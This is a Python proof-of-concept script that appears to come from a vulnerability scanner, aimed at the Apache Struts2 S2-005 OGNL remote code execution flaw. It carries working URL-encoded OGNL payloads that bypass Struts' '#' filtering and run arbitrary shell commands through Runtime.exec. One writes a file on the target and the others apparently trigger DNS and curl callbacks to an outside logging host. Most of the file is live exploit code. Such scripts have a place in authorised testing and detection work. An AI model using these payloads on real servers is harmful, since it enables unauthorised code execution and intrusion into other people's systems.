#!/usr/bin/env python		
#coding:utf-8

"""
S2-005 远程代码执行漏洞

Desc
	s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。
	OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，
	对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，
	攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上
Version
	2.0.0 - 2.1.8.1
Usage:
	
Referer:
	http://struts.apache.org/docs/s2-005.html
"""
import sys
sys.path.append('../../')
import requests
from plugin.dnslog import Dnslog

def poc(url):
	"""无回显payload, 暂不提供检测"""
	url = url if '://' in url else 'http://' + url
	url = url.split('#')[0].split('?')[0]

	command = "touch /tmp/success"
	mydnslog = Dnslog("s2005")
	dnslog_cmd = mydnslog.getCommand("dns")
	print(dnslog_cmd)
	web_curl_cmd = mydnslog.getCommand("web_curl")
	payloads = [
		 # 无回显payload
		 "?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22{cmd}%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1".format(
			 cmd=command),
		# dnslog payload
		"?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22{cmd}%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1".format(
			cmd=dnslog_cmd),
		"?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22{cmd}%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1".format(
			cmd=web_curl_cmd)
	]
	page1 = requests.get(url)
	for payload in payloads:
		vulurl = url + payload
		resp = requests.get(vulurl)
		if mydnslog.verifyDNS(3):
			return "[s2-005] " + url
		if mydnslog.verifyHTTP(3):
			return "[s2-005] " + url
	return False

if __name__ == '__main__':
	print poc("http://localhost:8080/s2-005/")